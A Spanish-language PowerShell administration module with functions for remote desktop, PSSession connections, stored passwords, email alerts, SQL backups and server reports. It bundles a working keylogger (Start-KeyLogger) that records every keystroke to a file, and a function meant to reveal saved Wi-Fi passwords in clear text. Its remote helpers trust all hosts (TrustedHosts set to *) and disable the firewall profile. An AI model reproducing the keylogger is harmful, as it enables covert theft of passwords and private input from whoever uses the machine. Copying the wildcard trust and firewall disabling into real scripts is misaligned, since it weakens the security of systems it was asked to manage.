<#
Módulo de PowerShell
Creado por "Rubén Valeiro"

Indice de funciones:

0-Funciones
1-Connection
2-Remote
3-ObtenerPwdMail
4-ObtenerPwdBD
5-Enviar_mail
6-CarpetaBBD
7-BackupBD
8-InfoSRV
9-CrearHTML
10-LogReinicios
11-Start-KeyLogger
12-ShowPwdWifi
#>

#Función habilitar el escritorio remoto
function funciones {
$fun=@"
*** Indice ***

1-Connection
2-Remote
3-ObtenerPwdMail
4-ObtenerPwdBD
5-Enviar_mail
6-CarpetaBBD
7-BackupBD
8-InfoSRV
9-CrearHTML
10-LogReinicios
11-Start-KeyLogger
12-ShowPwdWifi

****************
"@
Write-Host $fun
}
function connection {
    
    <#

    .SYNOPSIS
    Función para habilitar el escritorio remoto en un servidor
    .DESCRIPTION
    Solo se permiten los parametros "deny" o "permit"
    .EXAMPLE
    conenction deny
    .EXAMPLE
    connection permit
    .NOTES
        Version:        1.0
        Author:         Rubén Valeiro
        Creation Date:  02-05-2020
    #>
    
    #Prueba de Github
    
    Param(
        [ValidateSet('deny', 'permit')]
        [Parameter(Mandatory = $True, HelpMessage = "¿Quieres permitir el acceso remoto a este equipo? 'deny' o 'permit'", Position = 1)]
        [string]$status
    )
    
    if ($status -eq "deny") {
        #Activar o Desactivar el Firewalle de Windows
        set-netfirewallprofile -Profile Private -Enabled true
        #Habilitar Terminal Server en el registro de Windows
        Set-Itemproperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name 'fDenyTSConnections' -value '1'
        Write-host "****** Firewall - Activado *** Terminal Server - Desactivado ******"
    }
    else {
        if ($status -eq "permit") {
            set-netfirewallprofile -Profile Private -Enabled false
            Set-Itemproperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name 'fDenyTSConnections' -value '0'
            Write-host "****** Firewall - Desactivado *** Terminal Server - Activado ******"
        }
        else {
            Write-host "****** No se realizó ningun cambio ******"
            Write-host "******* Utilice 'deny' o 'permit' *******"
        }
    }
}
#Función para crear una conexión remota de powershell
function remote {
    <#
    .SYNOPSIS
    Función para abrir una conexión "PSSession" remota
    .DESCRIPTION
    Se envia un email con el texto personalizado para el Asunto y la descripción
    .EXAMPLE
    remote "nombre_servidor" "nombre_usuario"
    .NOTES
        Version:        1.0
        Author:         Rubén Valeiro
        Creation Date:  02-05-2020
    #>
    param (
        [Parameter(Mandatory = $True, Position = 1)]
        [string]$servidor,
        [Parameter(Mandatory = $True, Position = 2)]
        [string]$usuario
    )
    Set-Item WSMan:\localhost\Client\TrustedHosts -Value *
    enter-pssession -ComputerName $servidor -Credential $usuario
}
#Función para obtener la contraseña para enviar el correo
function ObtenerPwdMail () {
    <#
    .SYNOPSIS
    Función para obtener la contraseña del correo electrónico
    .DESCRIPTION
    Comprueba que exista tanto la carpeta como el archivo "TXT" que contiene la contraseña
    .NOTES
        Version:        1.0
        Author:         Rubén Valeiro
        Creation Date:  02-05-2020
    #>
    $carpetaPWD = Get-Item C:\scripts
    $archicoPWD = Get-ChildItem -Path "C:\scripts\password_correo.txt"
    if ($archicoPWD) {
        $password = Get-Content "c:\scripts\password_correo.txt" | ConvertTo-SecureString 
    
    }
    else {
        if ($carpetaPWD) {
            (Get-Credential).Password | ConvertFrom-SecureString | Out-File C:\scripts\password_correo.txt
            $password = Get-Content "c:\scripts\password_correo.txt" | ConvertTo-SecureString 
    
        }
        else {
            mkdir C:\scripts
            (Get-Credential).Password | ConvertFrom-SecureString | Out-File C:\scripts\password_correo.txt
            $password = Get-Content "c:\scripts\password_correo.txt" | ConvertTo-SecureString 
    
        }
    }
    Return $password  
}
#Función para obtener la contraseña para trabajar con la base de datos
function ObtenerPwdBD () {
    <#
    .SYNOPSIS
    Función para obtener la contraseña del correo electrónico
    .DESCRIPTION
    Comprueba que exista tanto la carpeta como el archivo "TXT" que contiene la contraseña
    .NOTES
        Version:        1.0
        Author:         Rubén Valeiro
        Creation Date:  02-05-2020
    #>
    $carpetaPWD = Get-Item C:\scripts
    $archicoPWD = Get-ChildItem -Path "C:\scripts\password_BD.txt"
    if ($archicoPWD) {
        $password = Get-Content "c:\scripts\password_BD.txt" | ConvertTo-SecureString 
    
    }
    else {
        if ($carpetaPWD) {
            (Get-Credential).Password | ConvertFrom-SecureString | Out-File C:\scripts\password_BD.txt
            $password = Get-Content "c:\scripts\password_BD.txt" | ConvertTo-SecureString 
    
        }
        else {
            mkdir C:\scripts
            (Get-Credential).Password | ConvertFrom-SecureString | Out-File C:\scripts\password_BD.txt
            $password = Get-Content "c:\scripts\password_BD.txt" | ConvertTo-SecureString 
    
        }
    }
    Return $password  
}
#Función para enviar el correo electrónico
function enviar_mail () {

    <#
    .SYNOPSIS
    Función para enviar un mail
    .DESCRIPTION
    Se envia un email con el texto personalizado para el Asunto y la descripción
    .EXAMPLE
    enviar_mail "Asunto del correo" "Este es el texto que enviar"
    .EXAMPLE
    enviar_mail $variable_string_1 $variable_string_2
    .NOTES
        Version:        1.0
        Author:         Rubén Valeiro
        Creation Date:  02-05-2020
    #>
    param (
        [Parameter(Mandatory = $True, Position = 1)]
        [string]$asunto,
        [Parameter(Mandatory = $True, Position = 2)]
        [string]$descrip
    )
    $password = ObtenerPwdMail

    $rmail = "walas5995@gmail.com" 
    $email = "incidenciasvsm@gmail.com"
    $servermail = "smtp.gmail.com"
    $puerto = "587"
    $cred = New-Object System.Management.Automation.PsCredential("incidenciasvsm@gmail.com", $password)
    Send-MailMessage -To $rmail -Subject $asunto -body $descrip -from $email -SmtpServer $servermail -Port $puerto -Credential $cred -usessl       
}
#Función que comprueba si existe la carpeta donde guardar la copia
function carpetaBBD () {
    <#
    .SYNOPSIS
    Función para crear carpeta "backupBD"
    .DESCRIPTION
    Comprueba que exista la carpeta
    .NOTES
        Version:        1.0
        Author:         Rubén Valeiro
        Creation Date:  02-05-2020
    #>
    $carpetaPWD = Get-Item C:\backupBD
    if ($carpetaPWD) {
        #la carpeta existe !!!
    }
    else {
        mkdir C:\backupBD
    }
}
#Función que guarda una copia de seguridad de la BD que le indiquemos
function backupBD() {
    <#
        .SYNOPSIS
        Backup de la base de datos.
        .DESCRIPTION
        Tenemos que proporcionar el nombre de la instancia (".\sqlexpress") y el nombre de la base de datos 
        .EXAMPLE
        backupBD "instanceDB" "nameDB"
        .NOTES
        Version:        1.0
        Author:         Rubén Valeiro
        Creation Date:  02-05-2020
        #>
    param (
        [Parameter(Mandatory = $True, Position = 1)]
        [string]$instanceDB,
        [Parameter(Mandatory = $True, Position = 2)]
        [string]$nameDB
    )
    $pwd = ObtenerPwdBD
    carpetaBBD
    $cred = New-Object System.Management.Automation.PSCredential("sa", $pwd)
    #Ejecutar Consulta
    #Invoke-Sqlcmd -ServerInstance ".\sqlexpress" -Query "select * from BD_Test.dbo.personal"
        
    #backup de la base de datos
    #InstanceDB (default) --> ".\sqlexpress"
    $fecha = Get-Date -UFormat "%Y%m%d"
    $archivo = "c:\backupBD\" + $nameDB + "_" + $fecha + ".bak"

    Backup-SqlDatabase -BackupFile $archivo -ServerInstance $instanceDB -Database $nameDB -Credential $cred


}
function infoSRV {
    <#
            .SYNOPSIS
            Mostrar información de los servidores de la empresa
            .DESCRIPTION
            Obtenemos memoria, disco duro, ROL,...
            .EXAMPLE
            infoSRV "nombre_SRV"
            .NOTES
            Version:        1.0
            Author:         Rubén Valeiro
            Creation Date:  03-05-2020
            #>
    param (
        [Parameter(Mandatory = $True, Position = 1)]
        [string]$srv
    )
    $infoPC = Get-ComputerInfo
    Write-Host "******* INFO *******"
    Write-Host "       "
    Write-Host "Nombre: " $infoPC.CsName
    Write-Host "Dominio: " $infoPC.CsDomain
    Write-Host "Sistema Operativo: " $infoPC.WindowsProductName
    Write-Host "Arquitectura: " $infoPC.OsArchitecture
    #Write-Host "Procesador: " $infoPC.CsProcessors
    #Memoria
    Write-Host "       "
    Write-Host "Memoria RAM"
    Write-Host "       "
    $PysicalMemory = Get-WmiObject -class "win32_physicalmemory" -namespace "root\CIMV2" -ComputerName $srv
    write-Host "Total: $((($PysicalMemory).Capacity | Measure-Object -Sum).Sum/1GB)GB" 
    #Disco Duro
    <#
            $disco_libre = Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" | select -ExpandProperty freespace
            $disco_total = Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" |
            select -ExpandProperty size
            Write-Host "Disco Duro - Personal"
            Write-Host "Libre: "$disco_libre
            Write-Host "Total: "$disco_total
            #>
    #Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" |
    #Measure-Object -Property FreeSpace,Size -Sum |
    #Select-Object -Property Property,Sum           
    #Disco Duro
    Write-Host "       "
    Write-Host "Disco Duro"
    Write-Host "       "
    $partitions = Get-WmiObject -Class Win32_LogicalDisk -Filter 'DriveType = 3' | Select-Object PSComputerName, Caption, @{N = 'Capacity_GB'; E = { [math]::Round(($_.Size / 1GB), 2) } }, @{N = 'FreeSpace_GB'; E = { [math]::Round(($_.FreeSpace / 1GB), 2) } }, @{N = 'PercentUsed'; E = { [math]::Round(((($_.Size - $_.FreeSpace) / $_.Size) * 100), 2) } }, @{N = 'PercentFree'; E = { [math]::Round((($_.FreeSpace / $_.Size) * 100), 2) } }
    foreach ($z in $partitions) {  
        Write-Host "Particion         : $($z.Caption)" ;    
        Write-Host "Capacidad Total   : $($z.Capacity_GB)  GB" ;    
        Write-Host "Espacio Libre     : $($z.FreeSpace_GB) GB" ;    
        Write-Host "Porcentaje Usado  : $($z.PercentUsed)  %" ;    
        Write-Host "Porcentaje Libre  : $($z.PercentFree)  %" ;   
        Write-Host "";   
    }
    Write-Host "       "
    #Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" |
    #Measure-Object -Property FreeSpace,Size -Sum |
    #Select-Object -Property Property,Sum
    #Red 
    $ips = Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" }
    Write-Host "Direcciones IP"
    Write-Host "       "
    foreach ($ip in $ips) {
        Write-Host "*: "$ip.ipaddress
    }
    Write-Host "       "            
}
function crearHTML{
    <#
            .SYNOPSIS
            Crea web pasando una variable 
            .DESCRIPTION
            Crea un archivo ".HTML" con una tabla 
            .EXAMPLE
            crearHTML $variable
            .NOTES
            Version:        1.0
            Author:         Rubén Valeiro
            Creation Date:  03-05-2020
            #>
    param (
        [Parameter(Mandatory = $True, Position = 1)]
        $info
    )
$Header = @"
<style>
table{

}
.enhancedhtml-dynamic-table{
    background-color: #333;
	color: white;
	padding: 25px;  
}
h2{
    text-align: center;
}
thead{
    background-color:#333;
    color:white;
    text-align:left;
    vertical-align:bottom;
}
</style>
"@

    import-module EnhancedHTML2 -Force 
    $resultado = $info | ConvertTo-EnhancedHTMLFragment -As Table -PreContent "<h2>Informe Walas</h2>" -MakeTableDynamic
    #-CssStyleSheet  $Header  -CssUri .\style.css
    ConvertTo-EnhancedHTML -HTMLFragments $resultado -CssStyleSheet $Header | Out-File c:\scripts\informe.html
}
function LogReinicios {
    <#
            .SYNOPSIS
            Muestra los evento de apagado del sistema
            .DESCRIPTION
            Muestra los eventos del log de sistema por apagado del ordenador (1074)
            .EXAMPLE
            LogReinicios $computer
            .NOTES
            Version:        1.0
            Author:         Rubén Valeiro
            Creation Date:  03-05-2020
            #>
param (
    [Parameter(Mandatory = $True, Position = 0)]
    [string]$computer
)
            Get-EventLog -ComputerName $computer -LogName "system" | 
            Select-Object -First 1000 | Where-Object {$_.EventID -eq "1074"} | 
            Select-Object Index,EventID,Timegenerated,Message |Format-List

}
function InfoActivacion {
    <#
            .SYNOPSIS
            Información sobre la activación del sistema operativo
            .DESCRIPTION
            Nos muestra  el tipo de licencia,los últimos digitos ,
            estado de la misma y cuando expira.
            .EXAMPLE
            InfoActivacion $variable
            .NOTES
            Version:        1.0
            Author:         Rubén Valeiro
            Creation Date:  05-05-2020
            #>
    $licencia = Get-Command slmgr.vbs
    $data = $licencia | Select-Object -ExpandProperty source
    cscript $data /dli
}
function Start-KeyLogger($Path="C:\scripts\keylogger.txt") {
# Signatures for API Calls
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

# load signatures and make members available
$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

# create output file
$null = New-Item -Path $Path -ItemType File -Force

try
{
Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red

# create endless loop. When user presses CTRL+C, finally-block
# executes and shows the collected key presses
while ($true) {
Start-Sleep -Milliseconds 40

# scan all ASCII codes above 8
for ($ascii = 9; $ascii -le 254; $ascii++) {
# get current key state
$state = $API::GetAsyncKeyState($ascii)

# is key pressed?
if ($state -eq -32767) {
$null = [console]::CapsLock

# translate scan code to real code
$virtualKey = $API::MapVirtualKey($ascii, 3)

# get keyboard state for virtual keys
$kbstate = New-Object Byte[] 256
$checkkbstate = $API::GetKeyboardState($kbstate)

# prepare a StringBuilder to receive input key
$mychar = New-Object -TypeName System.Text.StringBuilder

# translate virtual key
$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

if ($success) 
{
# add key to logger file
[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
}
}
}
}
}
finally
{
# Abrir archivo para ver el resultado
# notepad $Path
}
}
function ShowPwdWifi{
    <#
            .SYNOPSIS
            Obtener la contraseña de nuestro perfil Wifi
            .DESCRIPTION
            Mostrar las contraseñas en texto plano de los 
            diferentes perfiles Wifi.
            .EXAMPLE
            ShowPwdWifi Nombre_Wifi
            .NOTES
            Version:        1.0
            Author:         Rubén Valeiro
            Creation Date:  17-05-2020
            #>
    param (
            [Parameter(Mandatory=$True,Position=1)]
            [string]$wifi
        )
    netsh
    wlan
    show profiles name="$wifi" key=clear
}

